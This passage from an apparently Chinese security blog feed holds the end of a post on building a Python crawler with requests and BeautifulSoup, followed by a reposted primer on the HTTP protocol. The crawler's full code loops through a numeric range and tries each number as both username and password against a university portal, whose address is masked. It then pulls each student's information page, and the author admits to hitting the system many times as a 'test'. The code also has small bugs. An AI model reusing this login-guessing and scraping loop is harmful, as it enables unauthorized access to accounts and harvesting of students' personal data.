<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div></pre></td></tr></table></figure>
<ul>
<li>data为Post提交的信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&apos;displayName&apos; : &apos;&apos;,</div><div class="line">&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">&apos;select&apos;: &apos;2&apos;,</div><div class="line">&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">&apos;operType&apos; : &apos;911&apos;,</div><div class="line">&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">&apos;userName&apos; : &apos;&apos;,</div><div class="line">&apos;passwd&apos; : &apos;&apos;</div></pre></td></tr></table></figure>
<h4 id="Request部分代码"><a href="#Request部分代码" class="headerlink" title="Request部分代码"></a>Request部分代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def Firstlogin(self):</div><div class="line">	Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line"></div><div class="line">def Secondlogin(self):</div><div class="line">	Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div></pre></td></tr></table></figure>
<h3 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a>BeautifulSoup库</h3><p>BeautifulSoup是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式,同样可使用dir()查看BeautifulSoup的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import BeautifulSoup</div><div class="line">&gt;&gt;&gt; dir(BeautifulSoup)</div><div class="line">[&apos;BeautifulSOAP&apos;, &apos;BeautifulSoup&apos;, &apos;BeautifulStoneSoup&apos;, &apos;CData&apos;, &apos;Comment&apos;, &apos;DEFAULT_OUTPUT_ENCODING&apos;, &apos;Declaration&apos;, &apos;ICantBelieveItsBeautifulSoup&apos;, &apos;MinimalSoup&apos;, &apos;NavigableString&apos;, &apos;PageElement&apos;, &apos;ProcessingInstruction&apos;, &apos;ResultSet&apos;, &apos;RobustHTMLParser&apos;, &apos;RobustInsanelyWackAssHTMLParser&apos;, &apos;RobustWackAssHTMLParser&apos;, &apos;RobustXMLParser&apos;, &apos;SGMLParseError&apos;, &apos;SGMLParser&apos;, &apos;SimplifyingSOAPParser&apos;, &apos;SoupStrainer&apos;, &apos;StopParsing&apos;, &apos;Tag&apos;, &apos;UnicodeDammit&apos;, &apos;__author__&apos;, &apos;__builtins__&apos;, &apos;__copyright__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__license__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__version__&apos;, &apos;_match_css_class&apos;, &apos;buildTagMap&apos;, &apos;chardet&apos;, &apos;codecs&apos;, &apos;generators&apos;, &apos;markupbase&apos;, &apos;name2codepoint&apos;, &apos;re&apos;, &apos;sgmllib&apos;, &apos;types&apos;]</div></pre></td></tr></table></figure>
<h4 id="解析成XML"><a href="#解析成XML" class="headerlink" title="解析成XML"></a>解析成XML</h4><p>默认情况下,Beautiful Soup会将当前文档作为HTML格式解析,如果要解析XML文档,要在 BeautifulSoup 构造方法中加入第二个参数 “xml”:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">soup = BeautifulSoup(markup, &quot;xml&quot;)</div></pre></td></tr></table></figure>
<h4 id="find-all"><a href="#find-all" class="headerlink" title="find_all()"></a>find_all()</h4><p>find_all() 方法将返回文档中符合条件的所有tag,返回结果是值包含一个元素的列表<br>在实践的过程中由于需要的信息是一个包含在一个tables标签下，由于返回的是列表，利用索引定位到响应的tr位置，而后for循环输出td的内容<br>循环输出tables的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">tables = soup.findAll(&apos;table&apos;)  </div><div class="line">tab = tables[0]  </div><div class="line">for tr in tab.findAll(&apos;tr&apos;):  </div><div class="line">    for td in tr.findAll(&apos;td&apos;):  </div><div class="line">        print td.getText(),</div></pre></td></tr></table></figure></p>
<h4 id="Python中逗号的作用"><a href="#Python中逗号的作用" class="headerlink" title="Python中逗号的作用"></a>Python中逗号的作用</h4><p>在find_all()方法循环输出一个table用到了一个逗号，而后了解到了逗号在Python有特殊的作用</p>
<ul>
<li><p>逗号在参数传递中的使用，作为参数的分隔符<br>例如def  abc(a,b)或者abc(1,2)</p>
</li>
<li><p>逗号在类型转化中的使用, 只有当b元组中只有一个元素的时候 ,需要逗号来转换为元组类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; a=11</div><div class="line">&gt;&gt;&gt; b=(a)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">11</div><div class="line">&gt;&gt;&gt; b=(a,)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11,)</div><div class="line">&gt;&gt;&gt; b=(a,22)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11, 22)</div><div class="line">&gt;&gt;&gt; b=(a,22,)</div><div class="line">&gt;&gt;&gt; b</div><div class="line">(11, 22)</div></pre></td></tr></table></figure>
</li>
<li><p>逗号在输出语句print中的妙用:print语句默认的会在后面加上换行,加了逗号之后,换行就变成了空格</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">for i in range(0,5):</div><div class="line">		print i</div><div class="line"></div><div class="line">0</div><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line"></div><div class="line"> for i in range(0,5):</div><div class="line">		print i,</div><div class="line"></div><div class="line">0 1 2 3 4</div></pre></td></tr></table></figure>
<h4 id="BeautifulSoup部分代码"><a href="#BeautifulSoup部分代码" class="headerlink" title="BeautifulSoup部分代码"></a>BeautifulSoup部分代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Thirdrequest = self.__session.get(geturl)</div><div class="line">	page = Thirdrequest.content</div><div class="line">	soup = BeautifulSoup(page,&quot;lxml&quot;)</div><div class="line">tr = soup.findAll(&apos;tr&apos;)</div><div class="line">for i in range(5,14):</div><div class="line">	for td in tr[i].findAll(&apos;td&apos;):</div><div class="line">		print  td.getText(),</div></pre></td></tr></table></figure>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>捕捉异常可以使用try/except语句。<br>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。<br>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">&lt;语句&gt;        #运行别的代码</div><div class="line">except &lt;名字&gt;：</div><div class="line">&lt;语句&gt;        #如果在try部份引发了&apos;name&apos;异常</div><div class="line">except &lt;名字&gt;，&lt;数据&gt;:</div><div class="line">&lt;语句&gt;        #如果引发了&apos;name&apos;异常，获得附加的数据</div><div class="line">else:</div><div class="line">&lt;语句&gt;        #如果没有异常发生</div></pre></td></tr></table></figure>
<h4 id="使用except而不带任何异常类型"><a href="#使用except而不带任何异常类型" class="headerlink" title="使用except而不带任何异常类型"></a>使用except而不带任何异常类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    正常的操作</div><div class="line">   ......................</div><div class="line">except:</div><div class="line">    发生异常，执行这块代码</div><div class="line">   ......................</div><div class="line">else:</div><div class="line">    如果没有异常执行这块代码</div></pre></td></tr></table></figure>
<h4 id="使用except而带多种异常类型"><a href="#使用except而带多种异常类型" class="headerlink" title="使用except而带多种异常类型"></a>使用except而带多种异常类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    正常的操作</div><div class="line">   ......................</div><div class="line">except(Exception1[, Exception2[,...ExceptionN]]]):</div><div class="line">   发生以上多个异常中的一个，执行这块代码</div><div class="line">   ......................</div><div class="line">else:</div><div class="line">    如果没有异常执行这块代码</div></pre></td></tr></table></figure>
<h4 id="try-finally-语句"><a href="#try-finally-语句" class="headerlink" title="try-finally 语句"></a>try-finally 语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">&lt;语句&gt;</div><div class="line">finally:</div><div class="line">&lt;语句&gt;    #退出try时总会执行</div><div class="line">raise</div></pre></td></tr></table></figure>
<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170512171743.jpg" alt=""></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line"># !/usr/bin/python</div><div class="line"></div><div class="line">import requests</div><div class="line">import time</div><div class="line">import os</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">class UCrawler(object):</div><div class="line">	&quot;&quot;&quot;docstring for UCrawler&quot;&quot;&quot;</div><div class="line">	__header = &#123;</div><div class="line">				&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;,</div><div class="line">				&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;,</div><div class="line">				&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">				&apos;Referer&apos;: &apos;http://xxxx.xxxx.edu.cn/&apos;,</div><div class="line">				&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</div><div class="line">				&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;</div><div class="line">		&#125;</div><div class="line">	__data1 = &#123;</div><div class="line">				&apos;displayName&apos; : &apos;&apos;,</div><div class="line">		  		&apos;displayPasswd&apos; : &apos;&apos;,</div><div class="line">		  		&apos;select&apos;: &apos;2&apos;,</div><div class="line">		  		&apos;submit.x&apos;: &apos;43&apos;,</div><div class="line">		  		&apos;submit.y&apos; : &apos;12&apos;,</div><div class="line">		  		&apos;operType&apos; : &apos;911&apos;,</div><div class="line">		  		&apos;random_form&apos; : &apos;5129319019753764987&apos;,</div><div class="line">		 		&apos;userName&apos; : &apos;xxxxxxx&apos;,</div><div class="line">		 		&apos;passwd&apos; : &apos;xxxxxxx&apos;</div><div class="line">		&#125;</div><div class="line">	__data2 = &#123;</div><div class="line">				&apos;isValidate&apos;:&apos;false&apos;,</div><div class="line">				&apos;userName&apos;:&apos;xxxxxxx&apos;,</div><div class="line">				&apos;passwd&apos;:&apos;xxxxxxx&apos;,</div><div class="line">				&apos;operType&apos;:&apos;911&apos;,</div><div class="line">		&#125;</div><div class="line">	__posturl1 = &apos;http://xxxx.xxxx.edu.cn/renzheng.jsp&apos;</div><div class="line">	__posturl2 = &apos;http://xxxx.xxxx.edu.cn/servlet/adminservlet&apos;</div><div class="line"></div><div class="line"></div><div class="line">	__session=requests.Session()</div><div class="line"></div><div class="line">	def Firstlogin(self):</div><div class="line">		Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line"></div><div class="line">	def Secondlogin(self):</div><div class="line">		Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div><div class="line"></div><div class="line"></div><div class="line">	def PrintAndGet(self):</div><div class="line">		a = range(xxxxxxxx,xxxxxxx)</div><div class="line">		for tmp in a:</div><div class="line">			try:</div><div class="line">				username = str(tmp)</div><div class="line">				password = str(tmp)</div><div class="line">				self.__data1[&apos;userNam&apos;]=username</div><div class="line">				self.__data1[&apos;passwd&apos;]=password</div><div class="line">				self.__data2[&apos;userNam&apos;]=username</div><div class="line">				self.__data2[&apos;passwd&apos;]=password</div><div class="line">				Firstrequest = self.__session.post(self.__posturl1, data=self.__data1, headers=self.__header)</div><div class="line">				Secondrequest = self.__session.post(self.__posturl2, data=self.__data2, headers=self.__header)</div><div class="line">				geturl = http://xxxx.xxxx.edu.cn/student/studentInfo.jsp?userName&apos;+&apos;=&apos;+username+&apos;&amp;&apos;+&apos;passwd=&apos;+password</div><div class="line"></div><div class="line"></div><div class="line">				print &apos;\n&apos;</div><div class="line">			except IndexError:</div><div class="line">				continue</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">	U = UCrawler()</div><div class="line">	U.Firstlogin()</div><div class="line">	U.Secondlogin()</div><div class="line">	U.PrintAndGet()</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个编写过程还是蛮久的，毕竟自己的水平太low了，一边找资料一边写代码，然后查相关的知识点。还多次问学长一些很傻逼的问题，贼尴尬有没有，不过学长还是耐心的教我解决问题，在这个过程中学到很多Python的知识，包括相关的库的使用，常见的问题，异常处理等等方面。另外这整个过程中，可能对系统进行了很多次访问，在此表示歉意，并无恶意只是测试而已。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>【转载】HTTP：超文本传输协议</title>
    <link href="http://uknowsec.cn/posts/notes/HTTP%EF%BC%9A%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE.html"/>
    <id>http://uknowsec.cn/posts/notes/HTTP：超文本传输协议.html</id>
    <published>2017-05-01T13:34:09.000Z</published>
    <updated>2017-05-01T13:43:53.918Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-5a35e17f298a48e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""></p>
<h1 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h1><ul>
<li><p>1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p>
</li>
<li><p>2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p>
</li>
<li><p>3、无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</p>
</li>
<li><p>4、无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
</li>
<li><p>5、支持B/S及C/S模式。</p>
</li>
</ul>
<h1 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h1><p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息</p>
<p>URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成：</p>
<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a></p>
<p>从上面的URL可以看出，一个完整的URL包括以下几部分：</p>
<ul>
<li><p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
</li>
<li><p>2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
</li>
<li><p>3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
</li>
<li><p>4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
</li>
<li><p>5.文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
</li>
<li><p>6.锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
</li>
<li><p>7.参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
</li>
</ul>
<h1 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h1><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。</p>
<p>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：</p>
<ul>
<li>①访问资源的命名机制</li>
<li>②存放资源的主机名</li>
<li>③资源自身的名称，由路径表示，着重强调于资源。</li>
</ul>
<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p>
<p>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：</p>
<ul>
<li>①协议(或称为服务方式)</li>
<li>②存有该资源的主机IP地址(有时也包括端口号)</li>
<li>③主机资源的具体地址。如目录和文件名等</li>
</ul>
<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。</p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h1 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
<p>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。<br>Get请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept    image/webp,image/*,*/*;q=0.8</div><div class="line">Referer    http://www.imooc.com/</div><div class="line">Accept-Encoding    gzip, deflate, sdch</div><div class="line">Accept-Language    zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.</p>
<p>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。</p>
<p>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息</p>
<p>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等</p>
<p>第三部分：空行，请求头部后面的空行是必须的</p>
<p>即使第四部分的请求数据为空，也必须有空行。</p>
<p>第四部分：请求数据也叫主体，可以添加任意的其他数据。</p>
<p>这个例子的请求数据为空。</p>
<p>POST请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
<h1 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h1><p>一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。</p>
<p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Fri, 22 May 2009 06:07:21 GMT</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">      &lt;head&gt;&lt;/head&gt;</div><div class="line">      &lt;body&gt;</div><div class="line">            &lt;!--body goes here--&gt;</div><div class="line">      &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</p>
<p>第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</p>
<p>第二部分：消息报头，用来说明客户端要使用的一些附加信息</p>
<p>第二行和第三行为消息报头，<br>Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</p>
<p>第三部分：空行，消息报头后面的空行是必须的</p>
<p>第四部分：响应正文，服务器返回给客户端的文本信息。</p>
<p>空行后面的html部分为响应正文。</p>
<h1 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h1><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
<p>1xx：指示信息–表示请求已接收，继续处理</p>
<p>2xx：成功–表示请求已被成功接收、理解、接受</p>
<p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
<p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
<p>5xx：服务器端错误–服务器未能实现合法的请求</p>
<p>常见状态码：</p>
<p>200 OK                        //客户端请求成功<br>400 Bad Request               //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden                 //服务器收到请求，但是拒绝提供服务<br>404 Not Found                 //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error     //服务器发生不可预期的错误<br>503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常<br>更多状态码<a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="external">http://www.runoob.com/http/http-status-codes.html</a></p>
